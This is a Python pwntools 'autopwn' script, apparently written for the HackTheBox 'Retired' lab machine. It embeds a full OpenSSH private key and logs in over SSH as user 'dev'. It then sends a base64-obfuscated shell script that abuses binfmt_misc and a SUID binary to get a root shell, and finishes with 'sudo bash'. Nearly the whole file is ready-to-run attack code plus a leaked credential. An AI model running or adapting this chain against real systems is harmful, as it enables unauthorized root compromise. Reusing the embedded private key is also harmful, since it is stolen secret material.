try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Retired ~ GatoGamer1155\n")
except:
    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ('-----BEGIN OPENSSH PRIVATE KEY-----\n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\n7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=\n-----END OPENSSH PRIVATE KEY-----')

os.system('echo "%s" > key' % (rsa))

request = ssh(host='10.10.11.154', user='dev', keyfile='key')
shell = request.process("/bin/sh")
payload = (b"cmVhZG9ubHkgc2VhcmNoc3VpZD0iL2Jpbi8iCnJlYWRvbmx5IG1vdW50cG9pbnQ9Ii9wcm9jL3N5\ncy9mcy9iaW5mbXRfbWlzYyIKcmVhZG9ubHkgZXhlPSIkMCIKCgp3YXJuKCkKewogICAgMT4mMiBl\nY2hvICRACn0KCmRpZSgpCnsKICAgIHdhcm4gJEAKICAgIGV4aXQgLTEKfQoKdXNhZ2UoKQp7CiAg\nICBjYXQgMT4mMiA8PEVPRgpVc2FnZTogJGV4ZQogICAgR2l2ZXMgeW91IGEgcm9vdCBzaGVsbCBp\nZiAvcHJvYy9zeXMvZnMvYmluZm10X21pc2MvcmVnaXN0ZXIgaXMgd3JpdGVhYmxlLAogICAgbm90\nZSB0aGF0IGl0IG11c3QgYmUgZW5mb3JjZWQgYnkgYW55IG90aGVyIG1lYW4gYmVmb3JlIHlvdXIg\ndHJ5IHRoaXMsIGZvcgogICAgZXhhbXBsZSBieSB0eXBpbmcgc29tZXRoaW5nIGxpa2UgInN1ZG8g\nY2htb2QgKzYgLyovKi9mKi8qLypyIiB3aGlsZSBEYXZlIGlzCiAgICB0aGlua2luZyB0aGF0IHlv\ndSBhcmUgZml4aW5nIGhpcyBwcm9ibGVtLgpFT0YKICAgIGV4aXQgMQp9CgoKZnVuY3Rpb24gcGlj\na19zdWlkKCkKewogICAgZmluZCAiJDEiIC1wZXJtIC00MDAwIC1leGVjdXRhYmxlIFwKICAgICAg\nICB8IHRhaWwgLW4gMQp9CgpmdW5jdGlvbiByZWFkX21hZ2ljKCkKewogICAgW1sgLWUgIiQxIiBd\nXSAmJiBcCiAgICBbWyAiJDIiID1+IFtbOmRpZ2l0Ol1dKyBdXSAmJiBcCiAgICBkZCBpZj0iJDEi\nIGJzPTEgY291bnQ9IiQyIiBzdGF0dXM9bm9uZSBcCiAgICAgICAgfCBzZWQgLWUgJ3MtXHgwMC1c\nXHgwMC1nJwp9CgpbWyAtbiAiJDEiIF1dICYmIHVzYWdlCgp0YXJnZXQ9IiQocGlja19zdWlkICIk\nc2VhcmNoc3VpZCIpIgp0ZXN0IC1lICIkdGFyZ2V0IiB8fCBkaWUgIkVycm9yOiBVbmFibGUgdG8g\nZmluZCBhIHN1aWQgYmluYXJ5IGluICRzZWFyY2hzdWlkIgoKYmluZm10X21hZ2ljPSIkKHJlYWRf\nbWFnaWMgIiR0YXJnZXQiICIxMjYiKSIKdGVzdCAteiAiJGJpbmZtdF9tYWdpYyIgJiYgZGllICJF\ncnJvcjogVW5hYmxlIHRvIHJldHJpZXZlIGEgbWFnaWMgZm9yICR0YXJnZXQiCgpmbXRuYW1lPSIk\nKG1rdGVtcCAtdSBYWFhYKSIKZm10aW50ZXJwcj0iJChta3RlbXApIgoKZ2NjIC1vICIkZm10aW50\nZXJwciIgLXhjIC0gPDwtIF9fRU9GX18KICAgICNpbmNsdWRlIDxzdGRsaWIuaD4KICAgICNpbmNs\ndWRlIDx1bmlzdGQuaD4KICAgICNpbmNsdWRlIDxzdGRpby5oPgogICAgI2luY2x1ZGUgPHB3ZC5o\nPgoKICAgIGludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pCiAgICB7CiAgICAgICAgLy8g\ncmVtb3ZlIG91ciB0ZW1wb3JhcnkgZmlsZQogICAgICAgIHVubGluaygiJGZtdGludGVycHIiKTsK\nCiAgICAgICAgLy8gcmVtb3ZlIHRoZSB1bnVzZWQgYmluYXJ5IGZvcm1hdAogICAgICAgIEZJTEUq\nIGZtdCA9IGZvcGVuKCIkbW91bnRwb2ludC8kZm10bmFtZSIsICJ3Iik7CiAgICAgICAgZnByaW50\nZihmbXQsICItMVxcbiIpOwogICAgICAgIGZjbG9zZShmbXQpOwoKICAgICAgICAvLyBNT1RECiAg\nICAgICAgc2V0dWlkKDApOwogICAgICAgIHVpZF90IHVpZCA9IGdldHVpZCgpOwogICAgICAgIHVp\nZF90IGV1aWQgPSBnZXRldWlkKCk7CiAgICAgICAgc3RydWN0IHBhc3N3ZCAqcHcgPSBnZXRwd3Vp\nZCh1aWQpOwogICAgICAgIHN0cnVjdCBwYXNzd2QgKmVwdyA9IGdldHB3dWlkKGV1aWQpOwogICAg\nICAgIGZwcmludGYoc3RkZXJyLCAidWlkPSV1KCVzKSBldWlkPSV1KCVzKVxcbiIsCiAgICAgICAg\nICAgIHVpZCwKICAgICAgICAgICAgcHctPnB3X25hbWUsCiAgICAgICAgICAgIGV1aWQsCiAgICAg\nICAgICAgIGVwdy0+cHdfbmFtZSk7CgogICAgICAgIC8vIHdlbGNvbWUgaG9tZQogICAgICAgIGNo\nYXIqIHNoW10gPSB7Ii9iaW4vc2giLCAoY2hhciopIDB9OwogICAgICAgIGV4ZWN2cChzaFswXSwg\nc2gpOwogICAgICAgIHJldHVybiAxOwogICAgfQpfX0VPRl9fCgpjaG1vZCBhK3ggIiRmbXRpbnRl\ncnByIgoKYmluZm10X2xpbmU9Il8ke2ZtdG5hbWV9X01fXyR7YmluZm10X21hZ2ljfV9fJHtmbXRp\nbnRlcnByfV9PQyIKZWNobyAiJGJpbmZtdF9saW5lIiB8IC91c3IvbGliL2VtdWVtdS9yZWdfaGVs\ncGVyCgpleGVjICIkdGFyZ2V0Igo=")
shell.sendline(b"echo '%s' | base64 -d > exploit.sh; chmod +x exploit.sh" % (payload))
time.sleep(0.5)
shell.sendline(b"bash -c './exploit.sh'")
time.sleep(0.5)
shell.sendline(b"sudo bash")
time.sleep(0.5)
shell.sendline(b"export HOME=/root; cd")
time.sleep(0.5)
shell.interactive()